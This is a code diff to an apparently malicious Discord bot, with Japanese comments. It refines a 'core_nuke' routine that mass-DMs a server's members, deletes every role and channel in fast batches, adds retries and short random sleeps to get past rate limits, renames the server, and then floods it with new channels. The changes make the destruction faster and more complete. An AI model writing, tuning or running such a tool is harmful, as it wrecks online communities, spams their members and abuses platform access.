@@ -116,41 +116,53 @@ async def core_nuke(guild, new_server_name=None):
     # DM
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
-    # ロール削除（爆速 + 最低限ログ + 残り自動リトライ）
+    # ロール削除（ログ最低限 + 爆速バッチ + 自動リトライ）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
 
     async def delete_roles_batch(roles):
         await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
 
-    batch_size = 10
-    deleted = False
+    batch_size = 15  # 爆速に戻す
     attempt = 0
-    while not deleted and attempt < 3:  # 最大3回リトライ
+    while len(roles_to_delete) > 0 and attempt < 3:
         attempt += 1
         for i in range(0, len(roles_to_delete), batch_size):
             batch = roles_to_delete[i:i+batch_size]
             await delete_roles_batch(batch)
-            await asyncio.sleep(random.uniform(0.05, 0.15))  # 超短sleepで爆速
+            await asyncio.sleep(random.uniform(0.03, 0.08))  # 超短sleepで爆速
 
-        await asyncio.sleep(1)  # 反映待機
+        await asyncio.sleep(1.5)  # 反映待機
         remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
         if len(remaining) == 0:
-            deleted = True
-        else:
-            print(f"ロール削除試行{attempt}: 残り {len(remaining)}個 → リトライ")
-            roles_to_delete = remaining  # 残りを再対象
+            break
+        roles_to_delete = remaining
 
     print(f"ロール削除完了: 残り {len([r for r in await guild.fetch_roles() if not r.is_default() and not r.managed])}個")
 
-    # チャンネル削除（バッチ化で429回避）
+    # チャンネル削除（バッチ8 + sleep + リトライ）
     channels = list(guild.channels)
     print(f"チャンネル削除開始: 対象 {len(channels)}個")
-    batch_size_ch = 10
-    for i in range(0, len(channels), batch_size_ch):
-        batch_ch = channels[i:i+batch_size_ch]
-        await asyncio.gather(*(limited_global(ch.delete()) for ch in batch_ch), return_exceptions=True)
-        await asyncio.sleep(random.uniform(0.1, 0.3))
+
+    async def delete_channels_batch(chs):
+        await asyncio.gather(*(limited_global(ch.delete()) for ch in chs), return_exceptions=True)
+
+    batch_size_ch = 8
+    attempt_ch = 0
+    while len(channels) > 0 and attempt_ch < 3:
+        attempt_ch += 1
+        for i in range(0, len(channels), batch_size_ch):
+            batch_ch = channels[i:i+batch_size_ch]
+            await delete_channels_batch(batch_ch)
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+
+        await asyncio.sleep(2)  # 反映待機
+        remaining_ch = list(guild.channels)
+        if len(remaining_ch) == 0:
+            break
+        channels = remaining_ch
+
+    print(f"チャンネル削除完了: 残り {len(guild.channels)}個")
 
     # サーバー名変更
     try:
@@ -158,7 +170,7 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 規模別調整（爆速寄り）
+    # 規模別調整
     member_count = len(non_bot_members)
     if member_count < 100:
         target_channels = 80
@@ -223,7 +235,7 @@ async def core_nuke(guild, new_server_name=None):
 
     print("完了")
 
-# 管理View部分（前のまま）
+# 管理View（変更なし）
 class ManageView(discord.ui.View):
     def __init__(self, bot):
         super().__init__(timeout=None)
@@ -264,7 +276,6 @@ async def on_ready():
         await log_server_info(guild)
     print("=====================================")
 
-    # 管理チャンネルにView送信
     manage_guild = bot.get_guild(MANAGE_GUILD_ID)
     if manage_guild:
         manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
